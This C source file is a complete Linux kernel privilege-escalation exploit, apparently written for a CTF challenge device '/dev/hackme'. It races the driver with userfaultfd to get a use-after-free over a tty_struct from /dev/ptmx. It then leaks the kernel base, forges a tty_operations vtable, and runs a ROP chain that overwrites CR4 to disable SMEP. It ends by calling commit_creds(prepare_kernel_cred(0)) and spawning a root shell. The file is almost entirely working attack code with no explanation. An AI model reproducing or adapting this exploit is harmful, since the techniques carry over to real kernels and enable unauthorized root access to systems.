//gcc exp.c -o exp -lpthread -static
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <string.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <poll.h>
#include <pthread.h>
#include <errno.h>
#include <stdlib.h>
#include <signal.h>
#include <string.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <linux/userfaultfd.h>
#include <pthread.h>
#include <poll.h>
#include <sys/prctl.h>
#include <stdint.h>
#include <sys/wait.h>
void debug(){
    getchar();
}
int fd;
void init()
{
	fd = open("/dev/hackme", 0);
	if (fd < 0)
		exit(-1);
	puts("[*] init done!");
}
void errExit(const char* msg)
{
	puts(msg);
	exit(-1);
}
#define FAULT_PAGE ((void*)(0xdead000))

void* handler(void *arg)
{
	struct uffd_msg msg;
	uintptr_t uffd = (uintptr_t)arg;
	puts("[*] handler created");

	struct pollfd pollfd;
	int nready;
	pollfd.fd = uffd;
	pollfd.events = POLLIN;
	nready = poll(&pollfd,1,-1);
	if (nready != 1)
		errExit("wrong poll return value");
	// this will wait until copy_from_user is called on FAULT_PAGE
	printf("trigger! I'm going to hang\n");
	// now main thread stops at copy_from_user function
	// but now we can do some evil operations!

	
	if (read(uffd, &msg, sizeof(msg)) != sizeof(msg))
		errExit("error in reading uffd_msg");
	// read a msg struct from uffd, although not used
	puts("Begin to hang");
	while(1){
		sleep(10);
	}
	puts("Hang exit");
	return NULL;
}

void register_userfault()
{
	struct uffdio_api ua;
	struct uffdio_register ur;
	pthread_t thr;

	uint64_t uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
	ua.api = UFFD_API;
	ua.features = 0;
	if (ioctl(uffd, UFFDIO_API, &ua) == -1)
		errExit("ioctl-UFFDIO_API");
	// create the user fault fd

	if (mmap(FAULT_PAGE,0x1000,7,0x22,-1,0) != FAULT_PAGE)
		errExit("mmap fault page");
	// create page used for user fault

	ur.range.start = (unsigned long)FAULT_PAGE;
	ur.range.len = 0x1000;
	ur.mode = UFFDIO_REGISTER_MODE_MISSING;
	if (ioctl(uffd, UFFDIO_REGISTER, &ur) == -1)
		errExit("ioctl-UFFDIO_REGISTER");
	// register the page into user fault fd
	// so that if copy_from_user accesses FAULT_PAGE,
	// the access will be hanged, and uffd will receive something

	int s = pthread_create(&thr,NULL,handler,(void*)uffd);
	if(s!=0)
		errExit("pthread_create");
	// create handler that process the user fault
}
typedef struct _note{
	uint64_t index;
	char* buffer;
	uint64_t size;
	uint64_t offset;
}note;
#define TTY_STRUCT_SIZE 0x2e0
struct tty_operations {
	struct tty_struct * (*lookup)(struct tty_driver *driver,
	struct file *filp, int idx);
	int (*install)(struct tty_driver *driver, struct tty_struct *tty);
	void (*remove)(struct tty_driver *driver, struct tty_struct *tty);
	int (*open)(struct tty_struct * tty, struct file * filp);
	void (*close)(struct tty_struct * tty, struct file * filp);
	void (*shutdown)(struct tty_struct *tty);
	void (*cleanup)(struct tty_struct *tty);
	int (*write)(struct tty_struct * tty,
	const unsigned char *buf, int count);
	int (*put_char)(struct tty_struct *tty, unsigned char ch);
	void (*flush_chars)(struct tty_struct *tty);
	int (*write_room)(struct tty_struct *tty);
	int (*chars_in_buffer)(struct tty_struct *tty);
	int (*ioctl)(struct tty_struct *tty,
	unsigned int cmd, unsigned long arg);
	long (*compat_ioctl)(struct tty_struct *tty,
	unsigned int cmd, unsigned long arg);
	void (*set_termios)(struct tty_struct *tty, struct ktermios * old);
	void (*throttle)(struct tty_struct * tty);
	void (*unthrottle)(struct tty_struct * tty);
	void (*stop)(struct tty_struct *tty);
	void (*start)(struct tty_struct *tty);
	void (*hangup)(struct tty_struct *tty);
	int (*break_ctl)(struct tty_struct *tty, int state);
	void (*flush_buffer)(struct tty_struct *tty);
	void (*set_ldisc)(struct tty_struct *tty);
	void (*wait_until_sent)(struct tty_struct *tty, int timeout);
	void (*send_xchar)(struct tty_struct *tty, char ch);
	int (*tiocmget)(struct tty_struct *tty);
	int (*tiocmset)(struct tty_struct *tty,
	unsigned int set, unsigned int clear);
	int (*resize)(struct tty_struct *tty, struct winsize *ws);
	int (*set_termiox)(struct tty_struct *tty, struct termiox *tnew);
	int (*get_icount)(struct tty_struct *tty,
	struct serial_icounter_struct *icount);
	const struct file_operations *proc_fops;
};
typedef int __attribute__((regparm(3)))(*commit_creds_func)(unsigned long cred);
typedef unsigned long __attribute__((regparm(3))) (*prepare_kernel_cred_func)(unsigned long cred);
commit_creds_func commit_creds ;
prepare_kernel_cred_func prepare_kernel_cred ;
size_t user_cs, user_ss,user_rflags, user_sp ,user_gs,user_es,user_fs,user_ds;
void save_status(){
	__asm__("mov %%cs, %0\n"
	"mov %%ss,%1\n"
	"mov %%rsp,%2\n"
	"pushfq\n"
	"pop %3\n"
	"mov %%gs,%4\n"
	"mov %%es,%5\n"
	"mov %%fs,%6\n"
	"mov %%ds,%7\n"
	::"m"(user_cs),"m"(user_ss),"m"(user_sp),"m"(user_rflags),
	"m"(user_gs),"m"(user_es),"m"(user_fs),"m"(user_ds)
	);
	puts("[*]status has been saved.");
}

void shell(void) {
	if(!getuid())
		system("/bin/sh");
	exit(0);
}

void getroot() {
	commit_creds(prepare_kernel_cred(0));
}
void sudo(){
	getroot();
	asm(
	"push %0\n"
	"push %1\n"
	"push %2\n"
	"push %3\n"
	"push %4\n"
	"push $0\n"
	"swapgs\n"
	"pop %%rbp\n"
	"iretq\n"
	::"m"(user_ss),"m"(user_sp),"m"(user_rflags),"m"(user_cs),"a"(&shell)
	);
}

#define SIZE 0X200000
int main(int argc, char const *argv[]){
	save_status();
	init();
	note* no =(note*)malloc(sizeof(note));
	no->size = SIZE;
	char * buffer = (char*)malloc(SIZE);
	no->buffer = buffer;
	//add
	ioctl(fd,0x30000,no);
	//delete
	ioctl(fd,0x30001,no);
	int pid1 = fork();
	if(pid1<0){
		errExit("fork error");
	}
	if(pid1==0){
		register_userfault();
		no->index = 0;
		no->size = TTY_STRUCT_SIZE;
		no->buffer = (char*)FAULT_PAGE;
		//add to trigger userfault
		ioctl(fd,0x30000,no);
	}else{
		//wait until userfault trigger
		sleep(2);
		no->index = 0;
		int ptmx_fd = open("/dev/ptmx",0);
		uint64_t* readbuf = (uint64_t*)malloc(0x200);
		note *no1 =(note*) malloc(sizeof(note));		
		no1->index = 0;
		no1->size = 0x200;
		no1->buffer = (char*)readbuf;
		uint64_t head = 0x100005401;
		int mark = 0;
		int cnt,off;
		for(off = 0;;off+=0x200){
			no1->offset = off;
			ioctl(fd,0x30003,no1);
			cnt = 0;
			for(int i=0;i<(0x200/8);i++){
				if(readbuf[i] == head){
					mark = 1;
					break;	
				}	
				cnt +=8;
			
			}
			if(mark==1){
				break;
			}
		}
		int tty_offset = off+cnt;
		printf("Find tty struct at offset:%x\n",tty_offset);
		no1->offset = tty_offset;

		ioctl(fd,0x30003,no1);
		//for(int i=0;i<(0x200/8);i++){
		//	printf("%lx\n",readbuf[i]);
		//}
		//leak kernel base
		uint64_t kernel_base = readbuf[3]-0x625d80;
		printf("Kernel base is: 0x%lx\n",kernel_base);
		//leak the base of ptmx struct
		uint64_t ptmx_base = readbuf[7]-0x38;
		//let vtable point to ptmx_base[0x20]
		readbuf[3] = ptmx_base+0x100;
		uint64_t pop_rax = kernel_base + 0x1b5a1;// pop rax; ret;
		uint64_t write_cr4 = kernel_base + 0x252b;//mov cr4, rax; push rcx; popfq; pop rbp; ret; 
		uint64_t mov = kernel_base+0x186da8;//mov rax, qword ptr [r15 + 0x120]; mov rdi, r15; call qword ptr [rax + 0x58]; 
		uint64_t chrsp = kernel_base+0x200f66;//mov rsp,rax ...
		commit_creds = (commit_creds_func) (kernel_base+0x4d220);
		prepare_kernel_cred = (prepare_kernel_cred_func)(kernel_base + 0x4d3d0) ;
		printf("Hijack control flow to : 0x%lx\n",mov);
		//fake vtable
		for (int i =0;i<0x10;i++){
			readbuf[(0x100/8)+i]= mov;
		}

		ioctl(fd,0x30002,no1);

		memset(readbuf,0,0x200);
		readbuf[0x120/8] = ptmx_base+0x410;
		readbuf[2] = pop_rax;
		readbuf[3] = 0x6f0;
		readbuf[4] = write_cr4;
		readbuf[5] = 0;
		readbuf[6] = (uint64_t)(&sudo);
		readbuf[13] = chrsp;
		no1->offset = tty_offset+0x400;
		ioctl(fd,0x30002,no1);
		ioctl(ptmx_fd,0,0x0);
	}
	puts("Something wrong the program Exit");
	return 0;	
}

